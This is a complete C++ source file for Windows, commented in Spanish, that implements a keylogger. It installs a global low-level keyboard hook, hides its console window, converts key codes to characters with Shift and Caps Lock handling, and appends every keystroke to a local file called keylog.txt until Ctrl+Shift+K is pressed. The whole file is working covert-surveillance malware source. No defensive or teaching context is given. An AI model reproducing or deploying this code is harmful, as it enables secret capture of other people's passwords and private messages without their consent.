#include <windows.h>
#include <fstream>
#include <iostream>
#include <map>

std::ofstream logFile("keylog.txt", std::ios_base::app);

bool isShiftPressed() {
    return GetAsyncKeyState(VK_SHIFT) & 0x8000;
}

bool isCapsLockOn() {
    return GetKeyState(VK_CAPITAL) & 0x0001;
}

char toChar(DWORD vkCode, bool shiftPressed, bool capsLockOn) {
    // Mapeo directo para teclas alfanuméricas y algunos símbolos.
    // Este mapeo es específico para layouts de teclado de EE.UU.
    char c = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);

    // Manejo especial para mayúsculas y minúsculas.
    if (isalpha(c)) {
        if ((shiftPressed && !capsLockOn) || (!shiftPressed && capsLockOn)) {
            c = toupper(c);
        } else {
            c = tolower(c);
        }
    } else if (shiftPressed) {
        // Mapeo adicional específico para shift y caracteres.
        switch (vkCode) {
            // Símbolos accesibles con Shift
            case 0x31: return '!';
            case 0x32: return '@';
            case 0x33: return '#';
            case 0x34: return '$';
            case 0x35: return '%';
            case 0x36: return '^';
            case 0x37: return '&';
            case 0x38: return '*';
            case 0x39: return '(';
            case 0x30: return ')';
            case 0xBA: return ':';
            case 0xBB: return '+';
            case 0xBC: return '<';
            case 0xBD: return '_';
            case 0xBE: return '>';
            case 0xBF: return '?';
            case 0xC0: return '~';
            case 0xDB: return '{';
            case 0xDC: return '|';
            case 0xDD: return '}';
            case 0xDE: return '\"';
            // Agregar más casos según sea necesario para otros símbolos
        }
    } else {
        // Mapeo adicional específico para caracteres sin Shift
        switch (vkCode) {
            // Puedes agregar casos para símbolos que son accesibles sin Shift si es necesario
        }
    }

    return c; // Devuelve el carácter mapeado
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        bool shiftPressed = isShiftPressed();
        bool capsLockOn = isCapsLockOn();
        char c = toChar(p->vkCode, shiftPressed, capsLockOn);
        if (c != 0) { // Si se manejó el carácter
            logFile << c;
            logFile.flush();
        }

        // Combinación de teclas para cerrar: Ctrl + Shift + K
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && shiftPressed && p->vkCode == 'K') {
            logFile.close(); // Cierra el archivo de log antes de terminar
            PostQuitMessage(0); // Termina el programa
            return 1; // No pasar la tecla al siguiente hook
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE); // Oculta la ventana de consola

    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    if (!keyboardHook) {
        std::cerr << "Error al instalar el hook del teclado." << std::endl;
        return -1;
    }

    // Bucle de mensajes para mantener el hook activo
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}
